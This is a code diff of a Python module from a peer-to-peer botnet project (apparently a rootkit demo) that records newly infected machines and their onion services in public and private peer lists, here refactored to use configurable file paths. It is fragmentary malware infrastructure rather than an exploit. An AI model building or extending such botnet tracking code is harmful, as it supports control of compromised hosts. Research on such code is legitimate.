@@ -3,13 +3,22 @@
 import random
 
 from botnet_p2p import (
-    PUBLIC_PEER_LIST,
     MAX_PUBLIC_PEER_LIST_LENGTH,
-    PRIVATE_PEER_LIST,
     logger,
 )
 
-# ----------------- PUBLIC METHODS -----------------
+
+files_path = "/etc/rootkit_demo/"
+public_peer_list_path = files_path + "public/peer_list"
+private_peer_list_path = files_path + "private/full_peer_list"
+
+
+def change_peer_lists_locations(public_peer_list_new_path: str, private_peer_list_new_path: str):
+    global public_peer_list_path
+    global private_peer_list_path 
+
+    public_peer_list_path = public_peer_list_new_path
+    private_peer_list_path = private_peer_list_new_path 
 
 
 def add_new_infected_machine(msg_data: str):
@@ -20,21 +29,18 @@ def add_new_infected_machine(msg_data: str):
             msg_data: The username of the first created user in the infected machine,
                       and the onion services created
     """
-    __append_to_file(PRIVATE_PEER_LIST, msg_data)
+    __append_to_file(private_peer_list_path, msg_data)
 
     if not __public_peer_list_reached_maximum_length():
-        __append_to_file(PUBLIC_PEER_LIST, msg_data)
+        __append_to_file(public_peer_list_path, msg_data)
     else:
-        __overwrite_random_line_in_file(PUBLIC_PEER_LIST, msg_data)
-
-
-# ----------------- PRIVATE METHODS -----------------
+        __overwrite_random_line_in_file(public_peer_list_path, msg_data)
 
 
 def __public_peer_list_reached_maximum_length() -> bool:
     try:
-        logger.debug(PUBLIC_PEER_LIST)
-        with open(PUBLIC_PEER_LIST, "r") as peer_list:
+        logger.debug(public_peer_list_path)
+        with open(public_peer_list_path, "r") as peer_list:
             num_lines = sum(1 for line in peer_list)
     except FileNotFoundError:
         num_lines = 0
